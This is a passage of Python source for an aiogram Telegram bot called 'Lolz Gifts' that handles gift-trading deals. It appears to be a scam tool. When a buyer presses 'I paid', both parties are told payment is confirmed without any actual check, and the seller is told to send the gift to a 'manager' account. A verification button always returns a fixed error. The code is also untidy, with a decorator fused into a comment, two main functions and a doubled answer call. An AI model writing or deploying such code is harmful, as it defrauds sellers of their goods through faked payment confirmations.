    if not deal: return await call.answer("❌ Сделка не найдена")
    
    seller_id = deal[0]
    buyer_id = call.from_user.id
    
    # 2. Получаем данные обоих участников
    seller = db.get_user(seller_id)
    buyer = db.get_user(buyer_id)
    
    # Данные покупателя (для обоих текстов)
    b_name = f"@{call.from_user.username}" if call.from_user.username else "User"
    b_deals = buyer[13] if len(buyer) > 13 else 0
    b_rating = buyer[14] if len(buyer) > 14 else "0.0"
    
    # Данные продавца (для текста покупателю)
    s_name = f"@{seller[1]}" if seller[1] else "Hidden"

    # --- ТЕКСТ ДЛЯ ПОКУПАТЕЛЯ (МЕНЯЕТСЯ У НЕГО НА ЭКРАНЕ) ---
    text_for_buyer = (
        f"💳 <b>Оплата подтверждена!</b>\n"
        f"▸ Сделка: <code>#{did}</code>\n"
        f"▸ Покупатель: {b_name}\n"
        f"▸ Успешных сделок у покупателя: {b_deals}\n"
        f"▸ Рейтинг покупателя: {b_rating}/5\n"
        f"▸ Сумма: {deal[1]} {deal[2]}\n"
        f"▸ Описание: {deal[3]}\n\n"
        f"⏳ <b>Ожидайте, пока продавец {s_name} передаст подарок менеджеру @LolzRelayerGift для проверки.</b>"
    )

    # --- ТЕКСТ ДЛЯ ПРОДАВЦА (ПРИЛЕТАЕТ В ЛС С КНОПКОЙ) ---
    text_for_seller = (
        f"💳 <b>Оплата подтверждена!</b>\n"
        f"▸ Сделка: <code>#{did}</code>\n"
        f"▸ Покупатель: {b_name}\n"
        f"▸ Успешных сделок у покупателя: {b_deals}\n"
        f"▸ Рейтинг покупателя: {b_rating}/5\n"
        f"▸ Сумма: {deal[1]} {deal[2]}\n"
        f"▸ Описание: {deal[3]}\n\n"
        f"Отправьте подарок менеджеру @LolzRelayerGift для проверки.\n\n"
        f"⏳ Уведомление об оплате успешно доставлено покупателю."
    )

    # Кнопка только для тебя (продавца)
    kb_seller = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Я передал подарок", callback_data=f"gift_sent_{did}_{buyer_id}")]
    ])

    # 1. ОБНОВЛЯЕМ СООБЩЕНИЕ У ПОКУПАТЕЛЯ (Кнопка "Я оплатил" исчезает)
    try:
        if call.message.photo:
            await call.message.edit_caption(caption=text_for_buyer, reply_markup=None, parse_mode="HTML")
        else:
            await call.message.edit_text(text=text_for_buyer, reply_markup=None, parse_mode="HTML")
    except Exception as e:
        print(f"Ошибка обновления у покупателя: {e}")

    # 2. ОТПРАВЛЯЕМ СООБЩЕНИЕ ПРОДАВЦУ (С ФОТО И КНОПКОЙ)
    try:
        if os.path.exists(PHOTO_PATH):
            await bot.send_photo(
                chat_id=seller_id,
                photo=FSInputFile(PHOTO_PATH),
                caption=text_for_seller,
                reply_markup=kb_seller,
                parse_mode="HTML"
            )
        else:
            await bot.send_message(
                chat_id=seller_id,
                text=text_for_seller,
                reply_markup=kb_seller,
                parse_mode="HTML"
            )
    except Exception as e:
        print(f"Ошибка отправки продавцу: {e}")

    await call.answer()
# ХЕНДЛЕР ДЛЯ КНОПКИ ПОДТВЕРЖДЕНИЯ (ЧТОБЫ НЕ БЫЛО ОШИБКИ)@dp.callback_query(F.data.startswith("paid_"))
async def buyer_paid_handler(call: CallbackQuery):
    did = call.data.split("_")[1]
    
    # 1. Инфа о сделке
    db.cur.execute("SELECT seller_id, amount, currency, description FROM deals WHERE deal_id = ?", (did,))
    deal = db.cur.fetchone()
    if not deal: return await call.answer("❌ Сделка не найдена")
    
    seller_id = deal[0]
    buyer_id = call.from_user.id
    
    # 2. Инфа о продавце (для покупателя) и покупателе (для продавца)
    seller = db.get_user(seller_id)
    buyer = db.get_user(buyer_id)
    
    s_name = f"@{seller[1]}" if seller[1] else "Hidden"
    s_deals = seller[13] if len(seller) > 13 else 0
    s_rating = seller[14] if len(seller) > 14 else "0.0"
    
    b_name = f"@{call.from_user.username}" if call.from_user.username else "User"
    b_deals = buyer[13] if len(buyer) > 13 else 0
    b_rating = buyer[14] if len(buyer) > 14 else "0.0"

    # --- ТЕКСТ, КОТОРЫЙ СТАНЕТ У ПОКУПАТЕЛЯ (после нажатия) ---
    text_for_buyer = (
        f"💳 <b>Оплата подтверждена!</b>\n"
        f"▸ Сделка: <code>#{did}</code>\n"
        f"▸ Продавец: {s_name}\n"
        f"▸ Успешных сделок у продавца: {s_deals}\n"
        f"▸ Рейтинг продавца: {s_rating}/5\n"
        f"▸ Сумма: {deal[1]} {deal[2]}\n"
        f"▸ Описание: {deal[3]}\n\n"
        f"⏳ <b>Ожидайте, пока продавец передаст подарок менеджеру @LolzRelayerGift для проверки.</b>"
    )

    # --- ТЕКСТ, КОТОРЫЙ ПРИДЕТ ПРОДАВЦУ (ТЕБЕ) ---
    text_for_seller = (
        f"💳 <b>Оплата подтверждена!</b>\n"
        f"▸ Сделка: <code>#{did}</code>\n"
        f"▸ Покупатель: {b_name}\n"
        f"▸ Успешных сделок у покупателя: {b_deals}\n"
        f"▸ Рейтинг покупателя: {b_rating}/5\n"
        f"▸ Сумма: {deal[1]} {deal[2]}\n"
        f"▸ Описание: {deal[3]}\n\n"
        f"Отправьте подарок менеджеру @LolzRelayerGift для проверки.\n\n"
        f"⏳ Уведомление об оплате успешно доставлено покупателю."
    )

    # Кнопка для тебя (продавца)
    kb_seller = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Я передал подарок", callback_data=f"gift_sent_{did}_{buyer_id}")]
    ])

    # 1. МЕНЯЕМ СООБЩЕНИЕ У ПОКУПАТЕЛЯ (мгновенно)
    try:
        if call.message.photo:
            await call.message.edit_caption(caption=text_for_buyer, reply_markup=None, parse_mode="HTML")
        else:
            await call.message.edit_text(text=text_for_buyer, reply_markup=None, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Error editing buyer msg: {e}")

    # 2. ОТПРАВЛЯЕМ НОВОЕ СООБЩЕНИЕ ПРОДАВЦУ (с кнопкой)
    try:
        if os.path.exists(PHOTO_PATH):
            await bot.send_photo(
                chat_id=seller_id,
                photo=FSInputFile(PHOTO_PATH),
                caption=text_for_seller,
                reply_markup=kb_seller,
                parse_mode="HTML"
            )
        else:
            await bot.send_message(
                chat_id=seller_id,
                text=text_for_seller,
                reply_markup=kb_seller,
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Error sending seller msg: {e}")

    await call.answer()
# --- ФИНАЛЬНЫЕ ЭТАПЫ СДЕЛКИ ---
async def confirm_gift_handler(call: CallbackQuery):
    data = call.data.split("_")
    did = data[2]
    
    # Меняем текст у тебя в ЛС, чтобы кнопка пропала
    await call.message.edit_text(
        f"✅ <b>Успешно!</b>\nСделка #{did} передана на проверку менеджеру.\nОжидайте завершения.",
        parse_mode="HTML"
    )
    
    await call.answer("Заявка отправлена!", show_alert=True)
# --- ЗАПУСК ---
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
@dp.callback_query(F.data == "info_verif")
async def verification_handler(call: CallbackQuery):
    await call.answer("❌ Ошибка: Верификация доступна при общей сумме сделок от 100$;", show_alert=True)
    await call.answer("🤝 Сделка закрыта!")
async def main():
    try:
        print("🚀 Бот Lolz Gifts запущен и готов к работе!")
        # Удаляем старые обновления
        await bot.delete_webhook(drop_pending_updates=True)
        # Запуск прослушки
        await dp.start_polling(bot)
    except Exception as e:
        print(f"❌ Критическая ошибка: {e}")
    finally:
        # Закрываем соединение
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        print("\n❌ Бот остановлен")   